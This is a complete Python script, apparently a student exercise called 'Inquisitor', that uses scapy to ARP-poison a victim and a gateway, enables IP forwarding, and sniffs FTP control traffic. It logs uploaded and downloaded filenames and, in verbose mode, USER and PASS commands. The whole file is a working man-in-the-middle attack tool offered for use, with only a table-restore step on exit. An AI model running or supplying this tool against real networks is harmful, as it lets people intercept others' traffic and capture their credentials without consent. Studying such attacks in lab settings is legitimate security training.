#!/usr/bin/env python3

import argparse
import ipaddress
import re
import signal
import sys
import threading
import time

from scapy.all import ARP, Ether, IP, Raw, TCP, conf, get_if_hwaddr, sendp, sniff


MAC_PATTERN = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")


class InquisitorEngine:
	def __init__(self, gateway_ip, gateway_mac, victim_ip, victim_mac, iface, attacker_mac, verbose):
		self.gateway_ip = gateway_ip
		self.gateway_mac = gateway_mac.lower()
		self.victim_ip = victim_ip
		self.victim_mac = victim_mac.lower()
		self.iface = iface
		self.attacker_mac = attacker_mac.lower()
		self.verbose = verbose
		self.stop_event = threading.Event()
		self.ftp_buffers = {}

	def _log(self, message):
		if self.verbose:
			print(message)

	def send_fake_arp(self, destination_ip, destination_mac, fake_source_ip):
		packet = Ether(src=self.attacker_mac, dst=destination_mac) / ARP(
			op=2,
			pdst=destination_ip,
			hwdst=destination_mac,
			psrc=fake_source_ip,
			hwsrc=self.attacker_mac,
		)
		sendp(packet, iface=self.iface, verbose=False)

	def send_real_arp(self, destination_ip, destination_mac, real_source_ip, real_source_mac):
		packet = Ether(src=real_source_mac, dst=destination_mac) / ARP(
			op=2,
			pdst=destination_ip,
			hwdst=destination_mac,
			psrc=real_source_ip,
			hwsrc=real_source_mac,
		)
		sendp(packet, iface=self.iface, count=7, inter=0.2, verbose=False)

	def poisoning_loop(self):
		self._log("[+] ARP poisoning loop started")
		while not self.stop_event.is_set():
			try:
				self.send_fake_arp(self.victim_ip, self.victim_mac, self.gateway_ip)
				self.send_fake_arp(self.gateway_ip, self.gateway_mac, self.victim_ip)
				time.sleep(1)
			except Exception as exc:
				print(f"[!] Poisoning error: {exc}")
				time.sleep(1)

	def warmup_poisoning(self):
		for _ in range(8):
			if self.stop_event.is_set():
				break
			try:
				self.send_fake_arp(self.victim_ip, self.victim_mac, self.gateway_ip)
				self.send_fake_arp(self.gateway_ip, self.gateway_mac, self.victim_ip)
			except Exception as exc:
				print(f"[!] Warmup poisoning error: {exc}")
			time.sleep(0.15)

	def restore_tables(self):
		print("[!] Restoring ARP tables...")
		try:
			self.send_real_arp(self.victim_ip, self.victim_mac, self.gateway_ip, self.gateway_mac)
			self.send_real_arp(self.gateway_ip, self.gateway_mac, self.victim_ip, self.victim_mac)
			print("[+] ARP tables restored")
		except Exception as exc:
			print(f"[!] Failed to fully restore ARP tables: {exc}")

	def sniff_ftp_control(self):
		def packet_handler(pkt):
			try:
				if not pkt.haslayer(TCP):
					return
				tcp_layer = pkt[TCP]
				if tcp_layer.sport != 21 and tcp_layer.dport != 21:
					return

				if not pkt.haslayer(Raw):
					return
				payload = pkt[Raw].load.decode("utf-8", errors="ignore")
				if not payload:
					return

				src_ip = pkt[IP].src if pkt.haslayer(IP) else "?"
				dst_ip = pkt[IP].dst if pkt.haslayer(IP) else "?"
				flow_key = (src_ip, dst_ip, tcp_layer.sport, tcp_layer.dport)

				buffered = self.ftp_buffers.get(flow_key, "") + payload
				if len(buffered) > 8192:
					buffered = buffered[-8192:]

				while "\n" in buffered:
					line, buffered = buffered.split("\n", 1)
					line = line.rstrip("\r").strip()
					if not line:
						continue

					upper_line = line.upper()
					if upper_line.startswith("STOR "):
						print(f"[FTP][UPLOAD] {line[5:].strip()}")
					elif upper_line.startswith("RETR "):
						print(f"[FTP][DOWNLOAD] {line[5:].strip()}")
					elif self.verbose and upper_line.startswith(("USER ", "PASS ", "TYPE ", "PASV", "EPSV", "PORT ")):
						print(f"[FTP][CTRL] {src_ip}:{tcp_layer.sport} -> {dst_ip}:{tcp_layer.dport} | {line}")

				self.ftp_buffers[flow_key] = buffered
			except Exception as exc:
				print(f"[!] Packet parse error: {exc}")

		print("[+] Sniffing FTP control traffic on port 21")
		sniff(
			iface=self.iface,
			prn=packet_handler,
			store=False,
			promisc=True,
			stop_filter=lambda _: self.stop_event.is_set(),
		)

	def stop(self):
		self.stop_event.set()


def parse_cli_args():
	parser = argparse.ArgumentParser(description="Inquisitor: ARP poisoning + FTP filename sniffing")
	parser.add_argument("ip_src", help="IPv4 of source/gateway")
	parser.add_argument("mac_src", help="MAC of source/gateway")
	parser.add_argument("ip_target", help="IPv4 of target/victim")
	parser.add_argument("mac_target", help="MAC of target/victim")
	parser.add_argument("-i", "--iface", default=conf.iface, help="Network interface")
	parser.add_argument("-a", "--attacker-mac", default=None, help="Attacker MAC (auto-detected by default)")
	parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
	return parser.parse_args()


def is_valid_ipv4(text):
	try:
		parsed = ipaddress.ip_address(text)
		return parsed.version == 4
	except ValueError:
		return False


def is_valid_mac(text):
	return bool(MAC_PATTERN.match(text or ""))


def validate_input(args):
	checks = [
		(is_valid_ipv4(args.ip_src), f"Invalid IPv4 source: {args.ip_src}"),
		(is_valid_ipv4(args.ip_target), f"Invalid IPv4 target: {args.ip_target}"),
		(is_valid_mac(args.mac_src), f"Invalid MAC source: {args.mac_src}"),
		(is_valid_mac(args.mac_target), f"Invalid MAC target: {args.mac_target}"),
		(args.ip_src != args.ip_target, "Source and target IP must be different"),
		(args.mac_src.lower() != args.mac_target.lower(), "Source and target MAC must be different"),
	]
	for ok, message in checks:
		if not ok:
			raise ValueError(message)


def enable_ip_forwarding():
	forwarding_path = "/proc/sys/net/ipv4/ip_forward"
	try:
		with open(forwarding_path, "r", encoding="utf-8") as file_desc:
			current_value = file_desc.read().strip()
		if current_value == "1":
			return True

		with open(forwarding_path, "w", encoding="utf-8") as file_desc:
			file_desc.write("1\n")
		return True
	except Exception as exc:
		print(f"[!] Warning: unable to enable IPv4 forwarding automatically: {exc}")
		print("[!] Continuing anyway. Traffic redirection may fail if forwarding is disabled.")
		return False


def run():
	args = parse_cli_args()
	validate_input(args)

	attacker_mac = args.attacker_mac or get_if_hwaddr(args.iface)
	if not is_valid_mac(attacker_mac):
		raise ValueError(f"Invalid attacker MAC: {attacker_mac}")

	enable_ip_forwarding()

	engine = InquisitorEngine(
		gateway_ip=args.ip_src,
		gateway_mac=args.mac_src,
		victim_ip=args.ip_target,
		victim_mac=args.mac_target,
		iface=args.iface,
		attacker_mac=attacker_mac,
		verbose=args.verbose,
	)

	def _shutdown_handler(_signum, _frame):
		engine.stop()

	signal.signal(signal.SIGINT, _shutdown_handler)
	signal.signal(signal.SIGTERM, _shutdown_handler)

	poison_thread = threading.Thread(target=engine.poisoning_loop, daemon=True)
	poison_thread.start()
	engine.warmup_poisoning()

	try:
		engine.sniff_ftp_control()
	finally:
		engine.stop()
		poison_thread.join(timeout=2)
		engine.restore_tables()


def main():
	try:
		run()
	except Exception as exc:
		print(f"[!] Error: {exc}")
		sys.exit(1)


if __name__ == "__main__":
	main()
